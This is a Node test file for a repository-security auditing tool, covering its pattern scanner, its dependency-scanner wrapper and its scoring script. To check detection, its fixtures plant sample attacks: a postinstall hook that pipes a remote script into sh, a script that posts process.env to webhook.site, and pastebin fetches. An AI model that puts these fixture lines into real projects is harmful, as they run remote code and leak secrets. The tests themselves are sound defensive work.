// Fails when auditing-repo-security's scripts change their contract:
// scan-patterns.sh stops skipping installed directories, follows a symlink,
// drops an inventory check, reorders its output, or misreports a usage error,
// missing tool, or grep failure; scan-deps.mjs picks the wrong scanner or
// fallback, scans inside the clone instead of an isolated copy, miscounts
// missing lockfiles, or hides a scanner failure; score.mjs changes the points,
// grade bands, or verdict, or accepts malformed findings.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import test from "node:test";

import {
  isPinned,
  npmrcRegistries,
} from "../skills/engineering/auditing-repo-security/scripts/scan-deps.mjs";
import { score } from "../skills/engineering/auditing-repo-security/scripts/score.mjs";

const SCRIPTS = resolve("skills/engineering/auditing-repo-security/scripts");
const SCAN_PATTERNS = join(SCRIPTS, "scan-patterns.sh");
const SCAN_DEPS = join(SCRIPTS, "scan-deps.mjs");
const SCORE = join(SCRIPTS, "score.mjs");
const BASH = spawnSync("bash", ["-c", "command -v bash"], { encoding: "utf8" }).stdout.trim();
// Every external command scan-patterns.sh runs.
const PATTERN_TOOLS = ["grep", "find", "file", "awk", "sort", "readlink"];

function scratch(t) {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "auditing-repo-security-")));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

function realPath(tool) {
  const found = spawnSync(BASH, ["-c", `command -v ${tool}`], { encoding: "utf8" }).stdout.trim();
  assert.ok(found, `test host lacks ${tool}`);
  return found;
}

function writeFiles(root, files) {
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), content);
  }
}

// A PATH directory with `tools` linked from the host and `fakes` written as scripts.
function binDir(dir, { tools = [], fakes = {} } = {}) {
  const bin = join(dir, "bin");
  mkdirSync(bin);
  for (const tool of tools) symlinkSync(realPath(tool), join(bin, tool));
  for (const [name, body] of Object.entries(fakes)) {
    writeFileSync(join(bin, name), `#!/bin/sh\n${body}\n`);
    chmodSync(join(bin, name), 0o755);
  }
  return bin;
}

function scanPatterns(args, bin) {
  return spawnSync(BASH, [SCAN_PATTERNS, ...args], {
    encoding: "utf8",
    env: { PATH: bin, LC_ALL: "C" },
  });
}

const rows = (stdout) =>
  stdout
    .split("\n")
    .filter(Boolean)
    .map((line) => line.split("\t"));
const hits = (stdout, section, check) =>
  rows(stdout)
    .filter(([s, c]) => s === section && c === check)
    .map(([, , hit]) => hit);

// --- scan-patterns.sh -------------------------------------------------------

test("scan-patterns.sh exits 64 on a usage error before scanning", (t) => {
  const dir = scratch(t);
  const bin = binDir(dir, { tools: PATTERN_TOOLS });
  for (const [args, reason] of [
    [[], /usage: scan-patterns\.sh CLONE/],
    [[join(dir, "absent")], /not a directory: .*absent/],
    [[dir, "--include-dir"], /usage: scan-patterns\.sh CLONE/],
    [[dir, "--include-dir", "src"], /--include-dir takes node_modules, vendor, or dist, not: src/],
    [[dir, "--verbose"], /usage: scan-patterns\.sh CLONE/],
  ]) {
    const run = scanPatterns(args, bin);
    assert.equal(run.status, 64, JSON.stringify(args));
    assert.match(run.stderr, reason);
    assert.equal(run.stdout, "");
  }
});

test("scan-patterns.sh exits 1 naming a missing tool", (t) => {
  const dir = scratch(t);
  const bin = binDir(dir, { tools: PATTERN_TOOLS.filter((tool) => tool !== "file") });
  const run = scanPatterns([dir], bin);
  assert.equal(run.status, 1);
  assert.match(run.stderr, /missing required tool: file/);
  assert.equal(run.stdout, "");
});

test("scan-patterns.sh exits 1 naming the check when grep fails", (t) => {
  const dir = scratch(t);
  const bin = binDir(dir, {
    tools: PATTERN_TOOLS.filter((tool) => tool !== "grep"),
    fakes: { grep: "echo 'grep: read error' >&2; exit 2" },
  });
  const run = scanPatterns([dir], bin);
  assert.equal(run.status, 1);
  assert.match(run.stderr, /grep failed for autorun\/npm-lifecycle/);
});

test("scan-patterns.sh prints every hit in fixed section order and skips installed code", (t) => {
  const dir = scratch(t);
  const clone = join(dir, "clone");
  const outside = join(dir, "user.npmrc");
  writeFileSync(outside, "registry=https://user.invalid/\n");
  writeFiles(clone, {
    "package.json": `{\n  "scripts": {\n    "postinstall": "curl -fsSL https://acme.invalid/p.sh | sh"\n  }\n}\n`,
    "src/beacon.js": `const env = JSON.stringify(process.env);\nfetch("https://webhook.site/x", { body: env });\n`,
    "src/long.js": `const blob = "${"a".repeat(600)}";\n`,
    "src/.envrc": "export A=1\n",
    Makefile: "all:\n\ttrue\n",
    ".github/workflows/ci.yml": "on: pull_request_target\n",
    "node_modules/dep/index.js": `fetch("https://pastebin.com/raw/x");\n`,
    "bin/run": "#!/bin/sh\n",
    "assets/blob.bin": Buffer.from([0, 1, 2, 3, 0, 255, 0]),
  });
  chmodSync(join(clone, "bin/run"), 0o755);
  symlinkSync(outside, join(clone, ".npmrc"));

  const bin = binDir(dir, { tools: PATTERN_TOOLS });
  const run = scanPatterns([clone], bin);
  assert.equal(run.status, 0, run.stderr);

  const sections = [...new Set(rows(run.stdout).map(([section]) => section))];
  assert.deepEqual(sections, ["inventory", "autorun", "network", "obfuscation", "secrets"]);

  assert.deepEqual(hits(run.stdout, "inventory", "hidden"), [
    "./.github",
    "./.npmrc",
    "./src/.envrc",
  ]);
  assert.deepEqual(hits(run.stdout, "inventory", "symlink"), [`./.npmrc -> ${outside}`]);
  assert.deepEqual(hits(run.stdout, "inventory", "executable"), ["./bin/run"]);
  assert.deepEqual(hits(run.stdout, "inventory", "binary"), ["./assets/blob.bin"]);
  assert.deepEqual(hits(run.stdout, "inventory", "minified"), ["./src/long.js"]);

  assert.deepEqual(hits(run.stdout, "autorun", "npm-lifecycle"), [
    `./package.json:3:    "postinstall": "curl -fsSL https://acme.invalid/p.sh | sh"`,
  ]);
  assert.equal(hits(run.stdout, "autorun", "npm-lifecycle-shell").length, 1);
  assert.deepEqual(hits(run.stdout, "autorun", "npmrc"), [], "a symlinked .npmrc is never read");
  assert.deepEqual(hits(run.stdout, "autorun", "ci-fork-trigger"), [
    "./.github/workflows/ci.yml:1:on: pull_request_target",
  ]);
  assert.deepEqual(hits(run.stdout, "autorun", "read-in-full"), ["./Makefile", "./src/.envrc"]);

  assert.deepEqual(hits(run.stdout, "network", "js-request"), [
    `./src/beacon.js:2:fetch("https://webhook.site/x", { body: env });`,
  ]);
  assert.deepEqual(hits(run.stdout, "network", "exfil-endpoint"), [
    `./src/beacon.js:2:fetch("https://webhook.site/x", { body: env });`,
  ]);
  assert.deepEqual(hits(run.stdout, "secrets", "env-dump"), [
    "./src/beacon.js:1:const env = JSON.stringify(process.env);",
  ]);
  const [base64] = hits(run.stdout, "obfuscation", "base64-run");
  assert.equal(Buffer.byteLength(base64), 400, "a long match is cut to 400 bytes");
  assert.ok(!run.stdout.includes("node_modules/dep"), "node_modules is skipped by default");
});

test("scan-patterns.sh scans a directory named with --include-dir", (t) => {
  const dir = scratch(t);
  const clone = join(dir, "clone");
  writeFiles(clone, {
    "node_modules/dep/index.js": `fetch("https://pastebin.com/raw/x");\n`,
    "vendor/lib.rb": "Net::HTTP.get(URI('https://pastebin.com/x'))\n",
  });
  const bin = binDir(dir, { tools: PATTERN_TOOLS });
  const run = scanPatterns([clone, "--include-dir", "node_modules"], bin);
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(hits(run.stdout, "network", "exfil-endpoint"), [
    `./node_modules/dep/index.js:1:fetch("https://pastebin.com/raw/x");`,
  ]);
});

test("scan-patterns.sh prints nothing for a clean clone", (t) => {
  const dir = scratch(t);
  const clone = join(dir, "clone");
  writeFiles(clone, { "index.js": "module.exports = (a, b) => a + b;\n" });
  const run = scanPatterns([clone], binDir(dir, { tools: PATTERN_TOOLS }));
  assert.equal(run.status, 0, run.stderr);
  assert.equal(run.stdout, "");
});

// --- scan-deps.mjs ----------------------------------------------------------

// Shell code for a fake scanner that prints `out` to stdout and exits `status`.
const prints = (out, status = 0) => `printf '%s' '${out}'\nexit ${status}`;

function scanDeps(t, files, fakes = {}) {
  const dir = scratch(t);
  const clone = join(dir, "clone");
  mkdirSync(clone);
  writeFiles(clone, files);
  const log = join(dir, "scanners.log");
  writeFileSync(log, "");
  // Each fake logs its name, arguments, and the files in its working directory.
  const scripts = Object.fromEntries(
    Object.entries(fakes).map(([name, body]) => [
      name,
      `echo "\${0##*/} $* | $(/bin/ls -A | /usr/bin/tr '\\n' ' ')" >>'${log}'\n${body}`,
    ]),
  );
  const bin = binDir(dir, { fakes: scripts });
  const run = spawnSync(process.execPath, [SCAN_DEPS, clone], {
    encoding: "utf8",
    env: { PATH: bin, TMPDIR: dir },
  });
  const calls = readFileSync(log, "utf8").split("\n").filter(Boolean).sort();
  return { run, calls, json: run.stdout ? JSON.parse(run.stdout) : null };
}

test("scan-deps.mjs exits 2 on a usage error", (t) => {
  const dir = scratch(t);
  for (const [args, reason] of [
    [[], /usage: scan-deps\.mjs <clone>/],
    [[dir, dir], /usage: scan-deps\.mjs <clone>/],
    [[join(dir, "absent")], /not a directory: .*absent/],
  ]) {
    const run = spawnSync(process.execPath, [SCAN_DEPS, ...args], { encoding: "utf8" });
    assert.equal(run.status, 2, JSON.stringify(args));
    assert.match(run.stderr, reason);
    assert.equal(run.stdout, "");
  }
});

test("scan-deps.mjs lists manifests, missing lockfiles, ignore config, and registries", (t) => {
  const { run, json } = scanDeps(t, {
    "package.json": "{}",
    "package-lock.json": "{}",
    "packages/ui/package.json": "{}",
    "crates/core/Cargo.toml": "",
    "tools/requirements.txt": "requests>=2\n",
    "osv-scanner.toml": "",
    ".npmrc":
      "; comment\nregistry=https://npm.acme.invalid/\n@acme:registry = https://acme.invalid/\n//npm.acme.invalid/:_authToken=x\n",
    "node_modules/dep/package.json": "{}",
  });
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(json.manifests, [
    "crates/core/Cargo.toml",
    "package.json",
    "packages/ui/package.json",
  ]);
  assert.deepEqual(json.missingLockfile, ["crates/core/Cargo.toml", "tools/requirements.txt"]);
  assert.deepEqual(json.ignoreConfig, ["osv-scanner.toml"]);
  assert.deepEqual(json.npmrcRegistry, [
    { path: ".npmrc", line: 2, value: "registry=https://npm.acme.invalid/" },
    { path: ".npmrc", line: 3, value: "@acme:registry = https://acme.invalid/" },
  ]);
  assert.deepEqual(
    json.lockfiles.map(({ path, scanner, status }) => [path, scanner, status]),
    [
      ["package-lock.json", "npm", "not-installed"],
      ["tools/requirements.txt", "pip-audit", "not-installed"],
    ],
  );
  assert.deepEqual(json.scanners, {
    "osv-scanner": null,
    npm: null,
    "bundle-audit": null,
    "pip-audit": null,
    "cargo-audit": null,
  });
});

test("scan-deps.mjs runs osv-scanner on an isolated copy of every lockfile", (t) => {
  const { run, calls, json } = scanDeps(
    t,
    {
      "package.json": "{}",
      "package-lock.json": "{}",
      ".npmrc": "registry=https://npm.acme.invalid/\n",
      "web/yarn.lock": "",
      "web/package.json": "{}",
      "empty/go.sum": "",
    },
    {
      "osv-scanner": prints('{"results":[]}', 1),
      npm: prints("{}"),
    },
  );
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(calls, [
    "osv-scanner scan -L go.sum --format json | go.sum ",
    "osv-scanner scan -L package-lock.json --format json | package-lock.json ",
    "osv-scanner scan -L yarn.lock --format json | yarn.lock ",
  ]);
  assert.deepEqual(json.lockfiles[0], {
    path: "empty/go.sum",
    scanner: "osv-scanner",
    status: "ran",
    exitCode: 1,
    report: { results: [] },
  });
});

test("scan-deps.mjs treats osv-scanner's no-packages exit as an empty result", (t) => {
  const { run, json } = scanDeps(t, { "go.sum": "" }, { "osv-scanner": prints("", 128) });
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(json.lockfiles, [
    { path: "go.sum", scanner: "osv-scanner", status: "ran", exitCode: 128, report: null },
  ]);
});

test("scan-deps.mjs falls back per lockfile without osv-scanner", (t) => {
  const { run, calls, json } = scanDeps(
    t,
    {
      "package.json": "{}",
      "package-lock.json": "{}",
      "Cargo.lock": "",
      "Cargo.toml": "",
      "py/requirements.txt": "# pinned\nrequests==2.32.3 \\\n    --hash=sha256:abc\n",
      "yarn.lock": "",
    },
    {
      npm: prints('{"vulnerabilities":{}}', 1),
      "cargo-audit": prints('{"vulnerabilities":{"list":[]}}'),
      "pip-audit": prints('{"dependencies":[]}'),
    },
  );
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(calls, [
    "cargo-audit audit --file Cargo.lock --json | Cargo.lock ",
    "npm audit --package-lock-only --json | package-lock.json package.json ",
    "pip-audit -r requirements.txt --no-deps --disable-pip -f json | requirements.txt ",
  ]);
  assert.deepEqual(
    json.lockfiles.map(({ path, scanner, status }) => [path, scanner, status]),
    [
      ["Cargo.lock", "cargo-audit", "ran"],
      ["package-lock.json", "npm", "ran"],
      ["py/requirements.txt", "pip-audit", "ran"],
      ["yarn.lock", "osv-scanner", "not-installed"],
    ],
  );
});

test("scan-deps.mjs never hands pip-audit an unpinned requirements.txt", (t) => {
  const { run, calls, json } = scanDeps(
    t,
    { "requirements.txt": "-r base.txt\nrequests==2.32.3\n" },
    { "pip-audit": prints("{}") },
  );
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(calls, []);
  assert.deepEqual(json.lockfiles, [
    { path: "requirements.txt", scanner: "pip-audit", status: "unpinned" },
  ]);
  assert.deepEqual(json.missingLockfile, ["requirements.txt"]);
});

test("scan-deps.mjs reads bundle-audit's report from its output file", (t) => {
  const { run, json } = scanDeps(
    t,
    { "Gemfile.lock": "", Gemfile: "" },
    {
      "bundle-audit": `echo 'Updating ruby-advisory-db'\nprintf '{"results":[]}' >bundle-audit.json\nexit 1`,
    },
  );
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(json.lockfiles, [
    {
      path: "Gemfile.lock",
      scanner: "bundle-audit",
      status: "ran",
      exitCode: 1,
      report: { results: [] },
    },
  ]);
});

test("scan-deps.mjs exits 1 with the JSON still printed when a scanner fails", (t) => {
  const crashed = scanDeps(
    t,
    { "package-lock.json": "{}" },
    { npm: "echo 'npm ERR! network' >&2\nexit 2" },
  );
  assert.equal(crashed.run.status, 1);
  assert.match(crashed.run.stderr, /npm failed on package-lock\.json/);
  assert.deepEqual(crashed.json.lockfiles, [
    {
      path: "package-lock.json",
      scanner: "npm",
      status: "error",
      exitCode: 2,
      reason: "npm ERR! network\n",
    },
  ]);

  const garbled = scanDeps(t, { "Cargo.lock": "" }, { "cargo-audit": prints("not json") });
  assert.equal(garbled.run.status, 1);
  assert.equal(garbled.json.lockfiles[0].status, "error");
  assert.equal(garbled.json.lockfiles[0].reason, "cargo-audit printed output that is not JSON");
});

test("isPinned accepts only == pins, comments, and hash continuations", () => {
  assert.equal(isPinned(""), true);
  assert.equal(isPinned("Django[argon2]==5.1.2  # web\n\nrequests===2.0\n"), true);
  assert.equal(isPinned("requests==2.32.3 ; python_version >= '3.9'\n"), true);
  assert.equal(isPinned("requests>=2\n"), false);
  assert.equal(isPinned("requests\n"), false);
  assert.equal(isPinned("-e .\n"), false);
  assert.equal(isPinned("--index-url https://pypi.acme.invalid/\nrequests==2.32.3\n"), false);
});

test("npmrcRegistries reports registry settings and nothing else", () => {
  assert.deepEqual(
    npmrcRegistries("ignore-scripts=false\n  registry=https://a.invalid/\n#registry=https://b/\n"),
    [{ line: 2, value: "registry=https://a.invalid/" }],
  );
});

// --- score.mjs --------------------------------------------------------------

function runScore(input, args = []) {
  return spawnSync(process.execPath, [SCORE, ...args], { encoding: "utf8", input });
}

const findings = (...severities) =>
  severities.map((severity, i) => ({ id: `F${i + 1}`, severity }));

test("score.mjs scores an empty audit 100, A, safe to run", () => {
  const run = runScore("[]");
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(JSON.parse(run.stdout), {
    score: 100,
    grade: "A",
    safeToRun: "YES",
    countsBySeverity: { Critical: 0, High: 0, Medium: 0, Low: 0 },
  });
});

test("score subtracts each finding's points and grades at the band floors", () => {
  for (const [severities, expected, grade] of [
    [["Medium", "Medium"], 90, "A"],
    [["Medium", "Medium", "Low"], 88, "B"],
    [["Medium", "Medium", "Medium", "Medium"], 80, "B"],
    [["High", "High", "Medium", "Medium"], 70, "C"],
    [["High", "High", "High", "Medium", "Medium"], 60, "D"],
    [["Critical", "High", "Medium", "Low", "Low"], 56, "F"],
    [["Critical", "Critical", "Critical", "Critical", "Critical"], 0, "F"],
  ]) {
    const result = score(findings(...severities));
    assert.equal(result.score, expected, severities.join(","));
    assert.equal(result.grade, grade, severities.join(","));
  }
});

test("score takes the verdict from the highest severity, not the score", () => {
  assert.equal(score(findings("Critical")).safeToRun, "NO");
  assert.equal(score(findings("High", "Low")).safeToRun, "CONDITIONAL");
  assert.equal(score(findings(...Array(20).fill("Medium"))).safeToRun, "YES");
  assert.deepEqual(score(findings("High", "Low", "Low")).countsBySeverity, {
    Critical: 0,
    High: 1,
    Medium: 0,
    Low: 2,
  });
});

test("score.mjs exits 1 naming each problem in malformed findings", () => {
  for (const [input, reason] of [
    ["{not json", /stdin is not JSON/],
    ['{"id":"F1"}', /findings must be a JSON array/],
    [
      '[{"id":"F1","severity":"critical"}]',
      /finding 0: severity must be one of Critical, High, Medium, Low, not "critical"/,
    ],
    ['[{"severity":"Low"}]', /finding 0: id is required/],
    [
      '[{"id":"F1","severity":"Low"},{"id":"F1","severity":"High"}]',
      /finding 1: id F1 is repeated/,
    ],
  ]) {
    const run = runScore(input);
    assert.equal(run.status, 1, input);
    assert.match(run.stderr, reason);
    assert.equal(run.stdout, "");
  }
});

test("score.mjs exits 2 when given arguments", () => {
  const run = runScore("[]", ["findings.json"]);
  assert.equal(run.status, 2);
  assert.match(run.stderr, /^score\.mjs: usage: score\.mjs < findings\.json/);
});
